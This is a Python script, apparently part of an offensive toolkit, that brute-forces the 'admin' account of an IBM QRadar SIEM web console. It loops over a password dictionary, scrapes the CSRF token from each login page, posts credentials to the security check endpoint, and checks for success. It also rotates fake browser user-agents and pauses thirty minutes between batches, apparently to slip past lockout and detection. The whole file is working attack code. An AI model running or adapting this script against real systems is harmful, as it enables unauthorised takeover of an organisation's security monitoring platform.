#!/usr/bin/env python3

# QRadar Login Bruteforce

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import os
import time
import globals
import logging
import requests

# %%%%%%%%%% Functions %%%%%%%%%#


def qradar_brute(ip, port):
	__location__ = os.path.realpath(os.path.join(
		os.getcwd(), os.path.dirname(__file__)))
	file = open(os.path.join(__location__, 'dict.txt'))
	bfs = 0
	url_base = globals.https + ip + ":" + str(port)

	agents = [
		'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, '
		'like Gecko) Chrome/79.0.3945.88 Safari/537.36',
		'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) '
		'Gecko/20100101 Firefox/47.0',
		'Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) '
		'Gecko/20100101 Firefox/42.0',
		'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, '
		'like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41',
		'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) '
		'AppleWebKit/603.1.30 (KHTML, like Gecko)'
		' Version/10.0 Mobile/14E304 Safari/602.1'
	]
	a = 0

	for line in file:

		password = line.strip('\n\r')
		url = url_base + "/console/"
		session = requests.Session()
		headers = {'user-agent': agents[a]}
		response = session.get(url, headers=headers, verify=False)
		headers = {
			'user-agent': agents[a],
			'QRadarCSRF': 'null'
		}
		qradarcsrf = response.headers['Set-Cookie'][
			response.headers['Set-Cookie'].find('CSRF=') + 5:
			response.headers['Set-Cookie'].find('; Max')]

		params = {
			'j_username': 'admin',
			'j_password': password,
			'LoginCSRF': qradarcsrf
		}
		auth = url_base + "/console/j_security_check"

		try:
			response2 = session.post(auth, data=params, headers=headers, verify=False)

			if response2.url == url_base + "/console/core/jsp/Main.jsp" or response2.status_code == 322:
				globals.messages(7)
				globals.messages(9, ['admin', password])
				bfs = 1
				file.close()
				break
			else:
				if a <= 3:
					a += 1
				else:
					time.sleep(1800)
					a = 0

		except Exception as e:
			logging.error(e, exc_info=True)

	if bfs == 0:
		globals.messages(8)
		file.close()

# %%%%%%%%%% The End %%%%%%%%%%#
